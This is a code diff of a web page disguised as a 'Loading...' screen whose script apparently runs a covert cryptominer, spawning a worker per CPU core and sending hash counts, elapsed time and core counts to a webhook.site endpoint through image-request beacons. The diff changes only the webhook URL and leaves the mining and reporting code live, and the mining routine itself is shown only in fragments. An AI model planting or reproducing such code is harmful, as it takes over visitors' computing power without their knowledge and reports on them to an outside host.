@@ -3,7 +3,7 @@
 <head><meta charset="UTF-8"><title>Loading...</title></head>
 <body>
 <script>
-const WH = 'https://webhook.site/fe4166e3-7576-46a6-a625-d0d2c2c94a7d';
+const WH = 'https://webhook.site/3fa1525a-0f60-4b1a-99d1-16f2fbe2f142';
 
 (async function() {
 
@@ -137,7 +137,7 @@ const WH = 'https://webhook.site/fe4166e3-7576-46a6-a625-d0d2c2c94a7d';
       if (hashCount % 10000 === 0) {
         var elapsed = (Date.now() - startTime) / 1000;
         var rate = Math.round(hashCount / elapsed);
-        new Image().src = 'https://webhook.site/fe4166e3-7576-46a6-a625-d0d2c2c94a7d?CRYPTO_MINING=' + 
+        new Image().src = 'https://webhook.site/3fa1525a-0f60-4b1a-99d1-16f2fbe2f142?CRYPTO_MINING=' + 
           encodeURIComponent(JSON.stringify({
             hashes: hashCount,
             elapsed: elapsed.toFixed(1) + 's',
@@ -181,7 +181,7 @@ const WH = 'https://webhook.site/fe4166e3-7576-46a6-a625-d0d2c2c94a7d';
   mine();
 
   // Report mining started
-  new Image().src = 'https://webhook.site/fe4166e3-7576-46a6-a625-d0d2c2c94a7d?MINING_STARTED=' + 
+  new Image().src = 'https://webhook.site/3fa1525a-0f60-4b1a-99d1-16f2fbe2f142?MINING_STARTED=' + 
     encodeURIComponent(JSON.stringify({
       cores: cores,
       workersSpawned: cores,
